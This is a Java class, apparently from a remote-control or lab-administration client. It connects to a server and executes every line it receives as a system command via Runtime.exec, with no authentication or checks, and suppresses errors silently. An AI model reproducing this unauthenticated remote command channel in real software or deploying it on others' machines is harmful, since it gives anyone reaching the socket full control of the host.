import java.io.*;
import java.lang.*;
import java.awt.*;
import java.awt.image.*;
import javax.imageio.*;
import java.util.*;
import java.net.*;

public class BootHandler implements Runnable
{
 int port;
 DataInputStream bootcommand;

  public BootHandler(int port)
  {
   try
   {
    Thread t=new Thread(this);
    t.sleep(100);
    this.port=port;
    Client.cs_bootsocket=new Socket(Client.serverip,port);
    t.start();
   }
   catch(Exception e){System.out.println(e);}
  }

  public void run()
  {
   try
   {
    while(true)
    {
     try
     { 
      bootcommand=new DataInputStream(Client.cs_bootsocket.getInputStream());
      try
      {
       Runtime.getRuntime().exec(bootcommand.readLine().trim());
      }catch(Exception e){}
     }
     catch(Exception e)
     {
      if(e.toString().indexOf("Connection")!=-1)
      ClientRSTC.destroyClient();
      else
      System.exit(0);
      System.out.println(e);
      }
    }
   }
   catch(Exception e)
   {
      if(e.toString().indexOf("Connection")!=-1)
      ClientRSTC.destroyClient();
      else
      System.exit(0);
      System.out.println(e);
    }
  }
 }

